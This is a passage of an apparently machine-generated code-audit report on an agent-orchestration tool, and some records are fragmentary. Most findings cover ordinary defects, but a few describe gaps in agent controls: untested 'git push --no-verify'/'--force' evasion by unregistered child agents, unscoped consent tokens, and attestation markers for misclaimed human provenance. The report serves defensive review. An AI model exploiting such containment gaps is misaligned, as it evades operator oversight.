findings.impact: A genuinely huge file whose line count could not be measured is grouped with other files up to the line budget as if it weighed nothing, producing a review task whose real size far exceeds max_task_lines — the same 'unmeasured decayed into a number a comparison accepts' failure the module documents as fixed (measuredLinesOf docblock, :102-107). The tiny-test branch three functions later applies the opposite, correct discipline (lineCount !== undefined gate) citing exactly this reasoning, so the module contradicts itself. Mitigated but not closed by the resulting unmeasured_line_count tag; the deterministic fix is to route oversized classification through measuredLinesOf and treat unmeasured as oversized (own task) or explicitly record why it is exempt.
evidence: taskBuilder.ts:124-126 defines budgetLinesOf as measuredLinesOf(...) ?? 0, so unmeasured contributes 0 to the oversized comparison at :195-200.

taskBuilder.ts:362-370 guards the tiny-test classification with lineCount !== undefined and comments 'An UNMEASURED file is not known-small', while the oversized classification at :195-202 applies no such guard.
The unmeasured_path lead survives as the unmeasured_line_count tag (tagsFor, :188-194), but the budget arithmetic itself still treats the file as weightless.

findings.title: parseReflectionsNdjson re-implements AgentReflectionSchema validation by hand, contradicting the module's single-sourcing claim
findings.summary: The module header states the reflection shape is single-sourced by AgentReflectionSchema and parsed via parseReflectionsNdjson, but the parser never applies the schema: it re-checks task_id/instruction_clarity/severity with hand-written guards and copies each optional field with its own isStringArray line, so a field added to the strict schema is silently dropped from every parsed reflection until someone remembers to extend the parser, and a record carrying an unknown key passes the parser while failing the .strict() schema.
findings.impact: Two sources of truth for one shared contract used by both orchestrators: extending AgentReflectionSchema (the documented single source) does not change what parseReflectionsNdjson accepts or emits, so new reflection fields vanish from the aggregated Process Feedback section with no error. findings.title: Scoped-consent enforcement is unreachable in production: the executor's consentToken option is typed as a bare string
findings.summary: The consent chokepoint distinguishes a SCOPED grant (authorizes exactly the tools it names, so a grant obtained by offering tool A cannot admit tool B) from the legacy UNSCOPED bare string, which `consentTokenAdmits` reads as run-wide admission for EVERY undecided candidate (src/shared/analyzers/acquisitionEngine.ts:208-228, 292-305). The code retires the unsafe form only conditionally: 'It remains accepted only because retiring it is a caller-side change owned by the acquisition entry point's own node' (:222-227). But the production entry point has not made that change and its option TYPE makes the safe form impossible: `ExternalAcquisitionAdvanceOptions.consentToken?: string` (src/audit/orchestrator/acquisitionExecutor.ts:36) is forwarded verbatim into the engine (:107, :119), so the only token the real CLI path can ever issue is the unscoped one, and the scoped-grant branch of the chokepoint is exercised solely by tests. Consequence: an operator who consents to one offered analyzer in a session where several are undecided authorizes all of them, and the boundary that claims per-candidate scoping provides none in practice. The gap is one type widening away — accept `AnalyzerConsentTokenInput` on the advance options (and on the remediate close-verify path, src/remediate/phases/closeVerifyAnalyzerLeads.ts) so callers CAN issue grants — after which the legacy string form can be refused outright at the chokepoint instead of tolerated.

These are not cosmetic twins: the shared content IS the attestation contract. The marker list is the mechanism that makes a 'human' claim from an agent shell 'greppable as a contradiction after the fact' (both files' own words); adding a marker for a new harness must be remembered in two places, and whichever copy is missed silently stops detecting misclaimed provenance on that gate only - precisely the two-copies-decay-independently failure the project bans for durable traps. findings.summary: In handleReadyIntakeContractPipeline the memoized audit-source reader swallows every read/parse error and memoizes undefined, so a corrupt or unreadable audit-findings.json makes extractAuditFindings yield an empty set; the whole Path A branch (filter pass, review-approval gate, coverage-ledger-over-originals, reviewSourceSwap) is then skipped via the originals.length > 0 guard with no run-log event, no stderr line, and no artifact recording that the structured source failed to load.

findings.title: withFsRetry retries up to 20 times (~seconds of stall) emitting no signal, and classifies EEXIST as transient
findings.summary: Default 20 attempts with exponential backoff (20ms doubling to a 250ms cap) can stall a write for multiple seconds with zero logging or callback, and TRANSIENT_FS_CODES includes EEXIST, so a persistent contention problem surfaces only as a bare ENOSPC-style final error with no indication that 19 retries already happened.
findings.impact: An operator watching a hung next-step gets no diagnostic that rename contention is being retried, and the eventual error hides both the retry history and which attempt finally failed; EACCES-as-transient turns a config bug into a multi-second delay per call.
evidence: withFsRetry has no onRetry hook, logger parameter, or attempt counter surfaced on the rethrown error; the propagated error is the raw fs error from the LAST attempt only.
EACCES is normally a permission misconfiguration, not a lock race; retrying it 20 times delays surfacing a real misconfiguration while looking like a hang.

findings.title: CHANGED commits derive intent_baseline.revision from the frozen entry revision, so repeat changes never advance it
findings.summary: In runIntentEquivalenceResolve, every resolveChanged() stamps revision as currentEntryRevision(bundle)+1 and never floors at the prior intent_baseline revision, and withBaseline() does not touch metadata.artifacts - so two CHANGED resolutions occurring before the next metadata pass both compute the SAME revision number, and the second genuine intent change leaves downstream staleness unchanged (the unsafe under-stale direction this module's own contract forbids).
findings.impact: The header contract states a committed changed 'advances baseline.revision (downstreams re-stale exactly once)'. Because currentEntryRevision reads metadata.artifacts["intent_checkpoint.json"].revision - which only moves when the metadata stamper later mirrors the baseline - consecutive CHANGED arms (e.g. a structured change, then an interleaved host edit resolved again in the same drain window) stamp identical revisions. A downstream artifact derived at revision R sees baseline.revision still R+1 after the second change and is wrongly treated as fresh, running the audit against stale scoping. The equivalent arm already reads the prior baseline revision (bundle.artifact_metadata?.intent_baseline?.revision), so the fix is local: revision: Math.max(currentEntryRevision(bundle), bundle.artifact_metadata?.intent_baseline?.revision ?? 0) + 1.
evidence: Header contract, same file lines 8-9: "a committed `changed` advances `baseline.revision` (downstreams re-stale exactly once)".

withBaseline (same file) returns { ...bundle, artifact_metadata: { ...manifest, intent_baseline: baseline } } - the artifacts map holding the entry revision is untouched, so currentEntryRevision(bundle) is frozen across repeated resolves until a separate metadata pass runs.

The equivalent-verdict arm (same file, lines 227-234) sources revision from bundle.artifact_metadata?.intent_baseline?.revision ?? Math.max(currentEntryRevision(bundle), 1), demonstrating the prior-baseline value is available where resolveChanged omits it.
runtime:unit:src-audit: confirmed — Deterministic runtime command succeeded: npm test
reproduction: Load a bundle with intent_checkpoint set, artifact_metadata.intent_baseline present and gate-current, artifacts["intent_checkpoint.json"].revision = 5.
Mutate a structured field and run runIntentEquivalenceResolve - resolveChanged stamps baseline.revision = 6.

Interleave another structured-field mutation (no metadata pass in between) and run runIntentEquivalenceResolve again - resolveChanged stamps baseline.revision = 6 again; the second change is indistinguishable downstream from the first.

findings.title: Child-session push refusal is untested under push flag variants
findings.summary: This suite refuses a bare 'git push' from an unregistered child (C-2) and allows 'git push --no-verify' only for a registered owner session (C-9), but never pins the unregistered-child case with push flags such as --no-verify, --force, -q, or a leading git -c override, leaving the containment's reach against the exact evasion forms unproven.
findings.impact: If the push detector matches more narrowly than a bare 'git push', an unregistered child agent sharing the checkout could publish with a flagged push variant and the suite would stay green; whichever behavior is intended, it is currently unpinned and can regress silently.

By contrast the commit side does pin its flag interaction (C-14: child + --no-verify hits the hook-bypass refusal), so the asymmetry on the push side looks like an oversight rather than a decided exclusion.

findings.title: composeOpenCodeBashCeiling silently replaces a stricter user-authored top-level bash wildcard
findings.summary: composeOpenCodeBashCeiling seeds the composed block from the union ceiling, whose "*" always exists (defaulting to "ask", widened to "allow" whenever any agent block allows broadly), and then appends only existing keys the union does not cover - so an existing top-level bash["*"] of "deny" or "ask" is dropped without trace, while mergeOpenCodeGlobalPermissionRule in the same file deliberately preserves a non-managed existing wildcard verbatim.

findings.title: Edge-sort and tool-result ordering rely on localeCompare against a stated byte-determinism guarantee
findings.summary: normalizeGenericExternalEdges and upsertExternalToolResults document byte-identical/deterministic output but sort with localeCompare, which is locale/ICU-dependent, and no test pins ordering across locales the way the repo's own compareCodeUnits discipline does elsewhere.
findings.impact: On a host with a different ICU/locale collation (or after a Node ICU change), edge or tool ordering can differ for identical input, violating the documented run-to-run byte identity and churning artifact content hashes; existing tests run on one locale so they cannot detect it.
evidence: The normalizeGenericExternalEdges docblock states: output is sorted by from-then-to-then-kind so identical input yields byte-identical output run to run.

src/shared/artifactFreshness.ts imports compareCodeUnits from affinityArtifacts precisely to get code-unit ordering instead of locale ordering for hashing-critical sorts, showing the repo already owns the locale-free comparator this seam should use.

Both sorted outputs feed hashed/persisted artifacts (graph_edges on ExternalAnalyzerResults; the external_analyzer_results.json per-tool array), so an ordering flip between hosts perturbs serialized content.

findings.title: ESLint stderr is concatenated into the JSON buffer, so any stderr noise discards the entire run's findings
findings.summary: runEslint joins command stdout and stderr into one string and JSON.parses it, but eslint writes its JSON report to stdout only; a single stderr line (plugin deprecation notice, version warning) corrupts the buffer, the parse lands in the catch branch, and the whole run is downgraded to parse_error with zero findings extracted.
findings.impact: Real lint findings are silently replaced by a spurious diagnostic: coverage is lost for the run and the isNonCleanAnalyzerCoverage classification counts the tool as non-clean, reshaping prioritization based on a transport artifact rather than actual lint state.
evidence: At parse time results is still empty (messages are pushed only after JSON.parse succeeds), so the catch branch returns results: [] and status parse_error even though eslint exited having produced a valid report.
eslint legitimately writes to stderr on success (rule-deprecation and plugin notices under flat config), so the corruption path is reachable on a healthy run, not only on failures.
runtime:unit:src-audit: confirmed — Deterministic runtime command succeeded: npm test
reproduction: Install an eslint plugin that prints a deprecation warning to stderr, or force any stderr output during the lint run.
Run the syntax-resolution phase so runEslint executes.
The status record shows parse_error with an output_snippet beginning with the stderr text, and external_analyzer_results gains zero eslint items despite the JSON report on stdout.

findings.title: fileExclusionReason — the single-sourced cross-orchestrator exclusion policy — has no direct test of its field precedence or must_not_touch rule
findings.summary: pathScope.ts exists so audit's and remediate's scope decisions cannot drift ("a checkpoint yields the SAME per-file exclusion on both sides"), but tests/shared/pathScope.test.ts covers only the two primitive predicates globMatches and pathMatchesPrefix; the third export fileExclusionReason — including its documented precedence (excluded_scope, then excluded disposition_overrides, then must_not_touch globs) and the rule that a must_not_touch glob excludes a file from review scope — has no direct test anywhere in tests/.
findings.impact: The module's whole purpose is parity of exclusion decisions between the two orchestrators, and the parity property itself is unpinned: a change that reorders the field loops (making a must_not_touch glob beat an explicit excluded_scope entry's reason, or letting a non-excluded disposition status like binary/doc_only match) would change what both orchestrators drop, with only a comment in tests/remediate/checkpoint-filter.test.ts gesturing at the behavior. The EXCLUDED_OVERRIDE_STATUSES set (which statuses count as out-of-scope) is likewise untested.
evidence: grep over tests/ for fileExclusionReason|EXCLUDED_OVERRIDE_STATUSES matches only a comment at tests/remediate/checkpoint-filter.test.ts:112, no assertion
tests/shared/pathScope.test.ts destructures only { globMatches, pathMatchesPrefix } from the module
no test imports both orchestrators' consumers (intentScopeDisposition.ts and checkpointFilter.ts) to assert identical per-file exclusion for one checkpoint

findings.title: fixupBlocksAfterDedup drops emptied blocks but leaves dangling dependencies references in surviving blocks
findings.summary: When every item of a block merges away, fixupBlocksAfterDedup removes the block entirely but never rewrites or removes other blocks' dependencies entries naming the dropped block id, so a surviving block can declare a dependency that exists in no block of the plan; downstream dependency verification can then never satisfy it and the block is flagged dependency_missing and never scheduled.
findings.impact: A plan produced after a cross-lens dedup that empties an upstream block leaves dependent blocks permanently unschedulable: dependency resolution waits forever on a block id that no longer exists, the host-handoff ingest reports dependency_missing for the survivor, and the remediation run stalls until operator intervention.

findings.title: Flow id sanitizer is not injective, so distinct paths can mint identical flow ids
findings.summary: Both id derivations replace every character outside [a-zA-Z0-9:_-] with '-', so distinct filesystem paths that differ only in separator characters (for example src/lib/util.ts and a root-level src-lib-util.ts) sanitize to the same id; buildCriticalFlowManifest then pushes two flows carrying the same id into one manifest, and every consumer that keys flows by id — mergeCriticalFlowFallback's byId Map, a host fallback upgrading by id — silently keeps only one, dropping the other flow's coverage.
findings.impact: A repo containing both spellings loses a critical-flow (or data-evolution) flow without any diagnostic, because dedupeFlows keys on name|paths|concerns and the two flows have different names, so both enter the manifest with clashing ids. Downstream, whichever flow the Map construction order keeps last wins; a host fallback submitted against the shared id upgrades an arbitrary one of the pair, so the manifest's id-to-flow mapping is not well defined.
evidence: Surface ids: id: `flow:${surface.id.replace(/[^a-zA-Z0-9:_-]/g, "-")}` (line 114).

Data ids: id: `flow:data:${path.replace(/[^a-zA-Z0-9:_-]/g, "-")}` (line 132); '/' and '.' both collapse to '-', while '-' is preserved, so src/lib/util.ts and src-lib-util.ts both become flow:data:src-lib-util-ts.
buildCriticalFlowManifest pushes into flows without checking id collisions; dedupeFlows would not catch these anyway because their names differ.
mergeCriticalFlowFallback: const byId = new Map(manifest.flows.map((flow) => [flow.id, flow])); assumes ids are unique and silently keeps the last.

Pass the manifest through mergeCriticalFlowFallback with any fallback: the byId Map retains only one of the two flows.

findings.title: Four host-submission paths are read and type-cast into advanceAudit with no schema validation, unlike their siblings
findings.summary: intentEquivalenceVerdictPath, charterSubmissionPath, charterDeltaSubmissionPath, clarificationAnswersPath and systemicChallengePath are each parsed with a zod Schema.parse, but runtimeUpdatesPath, narrativeResultsPath, criticalFlowFallbackResultsPath and externalAnalyzerPath/externalAnalyzerData go straight from readJsonFile<T> (or a raw object) into advanceAudit on the strength of a compile-time type parameter only — a malformed or hostile payload's true shape is discovered (if at all) downstream.
findings.impact: This is the same lane that treats worker submissions as untrusted elsewhere (the file's own comments stress validating at the boundary), yet these four inputs carry no runtime assertion: a truncated or hand-edited narrative/runtime-validation/analyzer payload produces undefined-field access or silently-wrong state derivation inside advanceAudit instead of a clear boundary rejection. Per the project's auditor-agnostic robustness rule, the property should be guaranteed by the tool (a parse at this seam), not by the payload happening to be well-formed.
evidence: Lines 188-195: runtimeUpdatesPath and externalAnalyzer* are read with generic readJsonFile<T> and no validator.
Lines 196-203: narrativeResults and criticalFlowFallbackResults likewise unvalidated.
Contrast lines 204-228: the five sibling submissions each wrap readJsonFile in a zod .parse call.

findings.title: Friction-directory read failure is swallowed into an empty list, voiding the archive-loss accounting
findings.summary: readdir over frictionCaptureDir catches every error as an empty array, so a non-missing failure (permissions, IO error) zeroes the denominator of the archivedFriction comparison and friction records silently drop out of the lost set that gates the rm and tells the operator what to recover.
findings.impact: When the directory cannot be listed, promotion proceeds with no lost entry for friction records, so the delete gate's recovery warning under-enumerates the surviving files and the returned result describes a cleaner cleanup than actually happened; every sibling archive seam in the same function distinguishes isFileMissingError from other failures precisely to prevent this.
evidence: Lines 687-689: the .catch maps every rejection, including EACCES/EIO, to []; lines 697-704 then compare archivedFriction.length against that now-zero count, so 0 < 0 is false and nothing enters lost.

Same function, lines 654 and 672: the findings and agent-feedback archive paths explicitly gate on !isFileMissingError before treating a failure as loss — the friction count leg is the one member of the archive set with no such distinction.

findings.title: Git probe failures collapse into commit-fact issues
findings.summary: gitCommitExists, gitCommitIsAncestor and gitChangedFilesOfCommit discard spawnSyncHidden errors and rev-parse runs with --quiet, so a broken or busy git surfaces as commit_missing, baseline_not_ancestor, commit_not_landed or changed_files_mismatch assertions about the commits instead of a distinct probe-failure classification like the required-test runner's spawn_error.
findings.impact: A transient environment failure (git lock, missing binary, corrupt object store) is recorded in issues[] as a durable-sounding fact about the repository ('baseline_commit and commit_evidence.after must both resolve to real commits'), misattributing the cause and inviting exactly the wrong remediation; the same module classifies required-test spawn failures precisely to avoid this conflation.
evidence: all four git helpers reduce every failure mode to a boolean with no capture of result.error or stderr
--quiet explicitly suppresses git's own diagnostic, so nothing about the probe failure reaches any issue message
contrast runRequiredTest, whose RequiredTestFailure.outcome splits failed/timed_out/output_overflow/spawn_error precisely so environment signals are not read as verdicts on the work

findings.title: hostHandoff.ts stacks six distinct boundary concerns in one 2,132-line module
findings.summary: State-shape parsing (parseCurrentState), workload construction and re-derivation (buildWorkItem/buildCanonicalWorkload/parseWorkItem/parseWorkload), dual-contract result parsing (~180-line parseResult), git corroboration (gitCommitExists/gitCommitIsAncestor/gitCommitIsOrphaned/gitChangedFilesOfCommit), the required-test runner (runRequiredTest plus its timeout/buffer constants and verdict table), and the ingest loop (ingestRemediationHostResults) all live in one file, even though dispatch.ts's own header records the CP-NODE-7 precedent of splitting cohesive siblings under ./dispatch/.
findings.impact: Any change to one concern (say the git probe set) requires navigating four other concerns; review and test locality suffer, and the file keeps growing as the boundary gains rules.
evidence: dispatch.ts lines 4-7 document the earlier split: "The implementation was split into cohesive sibling modules under ./dispatch/ (CP-NODE-7)"

Independently cohesive seams in this file: git probes (lines 1156-1230), required-test runner (lines 1298-1503), recovery verdict precompute (1516-1556), corroboration (1558-1653), workload/result parsing (281-1137), ingest loop (1786-2132)

findings.title: Import-specifier exclusion guard (importSpecifierRanges) has no test pinning that imports do not double-emit reference edges
findings.summary: extractReferenceEdges computes offset ranges of import specifiers and skips them so a resolved import does not also produce a weaker relative-string-reference/repo-path-reference edge, but no test asserts a file's import yields exactly one edge; an off-by-one in the lastIndexOf offset arithmetic regresses into duplicate edges that inflate fan-in metrics with the suite green.
findings.impact: Every import statement in every audited TypeScript/JavaScript file would gain a second, lower-confidence reference edge to the same target, skewing fan-in/fan-out, hub detection, and cycle detection in graphSignals - a quality regression invisible to the current suite.
evidence: grep over tests/ finds 0 references to importSpecifierRanges or isImportSpecifierRange; the only assertions near these edge kinds (tests/audit/extractors-remediation.test.ts:877-899) assert that repo-path-reference / relative-string-reference edges EXIST for some literals, never that an import specifier produces ONLY its esm/commonjs edge.

Because esm and relative-string-reference have different kinds, uniqueSortedEdges keeps both when the guard fails - the corruption is additive and silent, feeding node fan-in/hub signals rather than crashing.

findings.title: Invalid triage_resolution.json yields a deterministic next-step crash loop instead of the refuse-and-re-halt every sibling gate uses
findings.summary: The waiting_for_triage executor persists status triage on existsSync(triageResolutionPath) alone, with no schema/id-join pre-check; runTriagePhase then throws on validation errors without archiving the resolution, so every subsequent next-step re-enters triage and throws again until an operator manually fixes or deletes the file — unlike the review, ambiguity, and clarification gates in this same file, which rename the refused resolution aside and re-halt with the valid id set.
evidence: Lines 4081-4086: the executor transitions to triage purely on existsSync(triageResolutionPath) and saves before any validation; the transition is what makes the triage obligation match on every later call.

findings.title: isUnmeasuredLineCount does not recognize null, the form the NaN sentinel takes after a JSON round-trip
findings.summary: The predicate tests only undefined and NaN, but NaN serializes to null in JSON — a round-trip this codebase itself documents — so a persisted-then-reloaded index entry reads as a present, non-unmeasured value, and each consumer patches around it locally with guards the module claims to have eliminated.
findings.impact: Any consumer that receives the index across a JSON boundary (artifact state, step payloads) gets null for unmeasured paths. null !== undefined and Number.isNaN(null) is false, so isUnmeasuredLineCount returns false and the entry is treated as a measured count; in arithmetic null coerces to 0, which is exactly the silent genuine-empty-file misread the sentinel was introduced to prevent (CP-NODE-6). Current callers survive only via local belt-and-braces: src/audit/orchestrator/requeueFold.ts:75 adds lineIndex[path] != null alongside the predicate, and src/audit/validation/auditResults.ts:784 re-guards with typeof expectedLineCount === "number" — per-call-site habits the module doc explicitly says the predicate replaces.
evidence: src/audit/orchestrator/requeueFold.ts:62 documents the round-trip in its own comment: '(`UNMEASURED_LINE_COUNT`, NaN — which JSON-serializes as `null`) all drop the' — acknowledging the null form exists in practice.
The predicate signature is (value: number | undefined), so TypeScript itself would reject a null-aware check today; widening to unknown (or never emitting NaN, see F-1) closes it mechanically.
Two independent consumers already carry compensating null guards, which is the drift pattern the shared predicate exists to prevent.

findings.title: localeCompare tie-break sorts contradict the modules' own byte-identical determinism guarantee
findings.summary: Three shared modules sort artifact-bound arrays with locale-sensitive String.prototype.localeCompare tie-breakers while their documentation promises lexicographic, byte-identical output, but localeCompare resolves against the runtime's ICU locale, so identical input can order differently (and differently from codepoint order for case/mixed-script paths) across hosts.
findings.impact: On hosts whose default locale differs, the git-history artifact, merged finding file lists, and derived friction observations can serialize in a different order for identical logical input, breaking the stated byte-identical guarantee and re-triggering expensive downstream re-runs via hash-churn staleness.
evidence: git.ts documents the mineGitHistory contract as 'Fully deterministic: every list is sorted by a total order (counts descending, then lexicographic ids) so identical history yields byte-identical output' (lines 191-192), then implements the id tie-break with localeCompare, which is neither codepoint-lexicographic nor host-independent (case-insensitive collation and locale-specific letter order such as sv-SE placing a-umlaut after z).

mergeAffectedFiles (dedupe.ts) persists its sort result into finding.affected_files, and deriveFrictionObservations (triage.ts) persists its order into open_observations; per the project's stable-order invariant, incidentally reordered arrays churn content hashes and cascade phantom staleness downstream.

The same repo already has the correct primitive pattern in normalizeAnchorPath/normalizeGraphPath (explicit lowercasing plus plain operators); a codepoint comparator ((a, b) => a < b ? -1 : a > b ? 1 : 0) or Intl.Collator pinned to a fixed locale would restore the documented total order.

findings.title: MAX_ANCHORS cap can silently drop analyzer-signal lead anchors, and omitted_anchor_count does not record that a lead was lost
findings.summary: Anchor sorting is by line then kind then name with no priority for analyzer_signal anchors, so on a large file whose first 160 line-ordered anchors are symbols/keywords the cap drops every external-analyzer lead; the worker never sees the lead and the summary reports only a bare omitted count plus a pre-cap analyzer_signals count, so lead loss is indistinguishable from lead absence.
findings.impact: The assignment rationale treats external analyzer signals as priority-raising input, yet on exactly the large files this isolated-large-file mode targets, the leads can be silently absent from the packet; a reviewer cannot tell whether a file had no analyzer findings or whether its findings were capped away.
evidence: Lines 410-415: the sort comparator is (line, kind, name) — analyzer_signal receives no precedence, so its survival depends purely on line position relative to keyword/symbol noise.

Line 65: MAX_ANCHORS = 160; keyword anchors are emitted per matching line (KEYWORD_PATTERN includes common words like token, cache, query, retry), so a few hundred matches on a god-file exhaust the budget before a late-line signal.

findings.title: maxTransitions backstop throws away the folded state, unlike the sibling cycle backstop which returns it
findings.summary: In advance(), the stateSignature cycle backstop returns the reached state gracefully (stopped: "cycle") so the caller can persist and render a terminal, but the maxTransitions backstop throws and discards current entirely, so a non-converging fold forfeits persistence of every legitimate transition completed before the runaway; the throw also fires even when the caller DID supply stateSignature, although the doc scopes the throw to callers that supply no signature.
findings.impact: The engine serves a resumability-first pipeline (state persists to an artifact dir between calls). An exception escaping advance() mid-fold loses all in-fold progress not yet persisted by the caller, converting a diagnosable non-convergence into lost work and an aborted call; returning { state, step: null, stopped: ... } like the cycle path would let the caller persist and surface a terminal instead.
evidence: Lines 205-211: the cycle path returns the reached state for graceful handling: return { state: current, step: null, stopped: "cycle" };
Lines 225-233: the maxTransitions path throws new Error(...) instead, so the caller never receives the state produced by the transitions that preceded the runaway and cannot persist it.

Lines 181-182 (doc): maxTransitions is described as the absolute backstop for callers that supply no signature, but the transitions counter at lines 201/225 is unconditional, so a signature-supplying caller whose fold legitimately exceeds 100 distinct transitions also gets a throw rather than graceful termination.
The thrown Error text itself recommends 'Supply opts.stateSignature for graceful cycle detection', confirming the throw is the degraded path rather than a desired terminal.

findings.title: merge-results writes run artifacts with bare writeFileSync and no cross-process lock on a critical flow
findings.summary: The merge core is careful about semantic completeness (fail-closed manifest read, manifest-judged acceptance, no-destructive-truncation — dispatch/merge-results.mjs:52-79, 165-179) but its WRITES are neither atomic nor serialized: `writeFileSync(failedTasksPath, ...)` (:167) and `writeFileSync(auditResultsPath, ...)` (:177) truncate-in-place, and nothing in dispatch/ takes the shared file lock that guards every other artifact writer in the package. Two exposure windows follow. (1) Crash/torn write: a merge killed mid-write leaves a partial run-results.json — the artifact findings synthesis consumes — and the 'no destructive truncation' guard does not help because the file is half-written rather than wrongly emptied. (2) Concurrent merge: two invocations computing different `passing` sets last-writer-wins the same path, silently dropping the loser's accepted results while both report success; the duplicate-task_id defense operates WITHIN one invocation's directory listing only. There is also a two-file ordering hazard: failed-tasks.json is written before run-results.json (:166-178), so a crash between the two persists a failure record for a merge whose results were never written. The package already owns the remedy (LockedJsonStore / withFileLock keyed on the run directory, plus writeFileAtomic); this critical flow ('findings synthesis emitting the machine contract' consumes these files) simply predates or bypasses it.

findings.title: NaN sentinel poisons arithmetic at ?? fallback consumers; the documented safety claim covers comparisons only
findings.summary: UNMEASURED_LINE_COUNT = NaN is stored in a Record<string, number> that is handed to consumers doing ?? 0 fallbacks and sums; NaN passes the ?? chain untouched and silently propagates through token/line arithmetic, so the module's claim that an unmeasured entry can never be silently misread only holds for comparisons, not for the arithmetic call sites that actually exist.

Downstream sizing helpers fall back to it with a nullish-coalescing chain that does not filter NaN: src/audit/orchestrator/reviewPacketShared.ts:32 (return task.file_line_counts?.[path] ?? lineIndex?.[path] ?? 0;) and src/audit/orchestrator/reviewPacketSizing.ts:48 (const lines = owner?.file_line_counts?.[path] ?? lineIndex?.[path] ?? 0;) both return the NaN, and the per-path sums built on them (taskContentTokens / fileGroupContentTokens in src/audit/orchestrator/planningExecutors.ts and reviewPackets.ts) become NaN. Every threshold comparison against a NaN total is false, so an oversized or under-grouped packet is never flagged — the failure is silent, not loud.
evidence: Doc comment lines 24-26 claim safety via IEEE 754: 'read as a genuine empty file by an unaware call site' — but the unaware call sites in this tree are arithmetic (sums, ?? 0 chains), where NaN neither equals 0 nor throws; it contaminates the total.

src/audit/orchestrator/executorRunners.ts:140 passes options.lineIndex ?? {} straight through, so the NaN-bearing raw index reaches packet sizing unfiltered.
isUnmeasuredLineCount exists precisely so call sites need not reimplement the check, but nothing routes these consumers through it — the predicate is opt-in knowledge, not a mechanical guarantee.

findings.title: Opposite-direction half the original missed: a Path-A DAG that omits source_finding_ids on EVERY node silently skips the identity-preserving projection (fail-open)
findings.summary: New finding from the deepening pass: the strict Path-A branch is armed by nodes.some((node) => Array.isArray(node.source_finding_ids)), so when a path_a_seed exists but no node declares the field, the entire canonical-work-block projection is skipped silently - findings stay node-derived instead of the canonical auditor findings, blocks carry node ids instead of canonical finding ids, and traceability keys on node ids - with no refusal, no friction record, and no upstream validator requiring the field, so the identity-preserving-projection invariant the function's own comment states is unenforced in the all-omitted case.
evidence: The branch trigger at 4059-4062 is approvedSource && nodes.some((node) => Array.isArray(node.source_finding_ids)); with the field absent on every node, the whole canonicalItemsByNodeId population block (4067-4108) never runs and the function proceeds as if Path-A promotion did not apply.

Both downstream consumers then fall back silently: the findings re-projection is gated on canonicalItemsByNodeId.size > 0 (4160) so findings remain the node-derived map (4110-4158), and blocks carry items: canonicalItemsByNodeId.get(nodeId) ?? [nodeId] (4274), so traceability (4199-4221) keys on node ids rather than canonical finding ids.

Nothing upstream requires the field: validateImplementationDAG never checks source_finding_ids and no promotion gate inspects its presence, so an all-omitting DAG is indistinguishable from a non-Path-A run even though path_a_seed.json exists and approvedSource resolved.

Impact: a Path-A run loses exactly what the projection exists to preserve - the comment at 4055-4057 states DAG node ids 'may not replace the canonical auditor finding ids or split/merge the canonical coherence components' - and the loss is invisible: no gate fires, no friction event is captured, and the promoted plan looks well-formed.

The two halves are one design defect: the same nodes.some arming that fail-opens the all-omitted case is what makes a partially-declaring DAG throw (F-1); a presence-or-absence gate at the promotion boundary (or a validator rule requiring the field on every node when a seed exists) would close both directions.
